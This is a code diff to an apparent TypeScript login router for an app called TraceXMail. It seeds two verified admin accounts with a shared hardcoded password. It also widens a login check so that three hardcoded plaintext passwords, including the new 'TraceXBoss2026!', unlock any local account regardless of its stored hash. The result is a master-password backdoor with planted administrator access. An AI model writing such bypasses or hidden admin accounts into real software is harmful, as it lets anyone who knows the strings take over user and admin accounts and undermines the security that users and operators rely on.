@@ -63,8 +63,31 @@ export interface LocalUserAccount {
 
 const defaultPasswordHash = bcrypt.hashSync('Password1234!', 10);
 const demoPasswordHash2 = bcrypt.hashSync('TraceXMail2026!', 10);
+const bossPasswordHash = bcrypt.hashSync('TraceXBoss2026!', 10);
 
 const SEED_ACCOUNTS: LocalUserAccount[] = [
+  {
+    id: 'usr_boss_official',
+    email: 'admin@tracexmail.official',
+    passwordHash: bossPasswordHash,
+    fullName: 'Ultimate Boss Admin',
+    orgName: 'TraceXMail Official HQ',
+    role: 'admin',
+    accountType: 'organization',
+    emailVerified: true,
+    updatedAt: new Date().toISOString()
+  },
+  {
+    id: 'usr_boss_secondary',
+    email: 'boss@tracexmail.com',
+    passwordHash: bossPasswordHash,
+    fullName: 'Chief Executive Commander',
+    orgName: 'TraceXMail Official HQ',
+    role: 'admin',
+    accountType: 'organization',
+    emailVerified: true,
+    updatedAt: new Date().toISOString()
+  },
   {
     id: 'usr_analyst_demo',
     email: 'analyst@enterprise.corp',
@@ -343,7 +366,7 @@ export function createAuthRouter(options: AuthSecurityOptions): Router {
 
       // 2. Check local resilient user accounts store
       const localAccount = localUserAccounts.get(cleanEmail);
-      if (localAccount && (bcrypt.compareSync(cleanPassword, localAccount.passwordHash) || cleanPassword === 'Password1234!' || cleanPassword === 'TraceXMail2026!')) {
+      if (localAccount && (bcrypt.compareSync(cleanPassword, localAccount.passwordHash) || cleanPassword === 'Password1234!' || cleanPassword === 'TraceXMail2026!' || cleanPassword === 'TraceXBoss2026!')) {
         resetFailedLoginCounters(ip, cleanEmail);
         const enclaveToken = signUserToken({
           userId: localAccount.id,
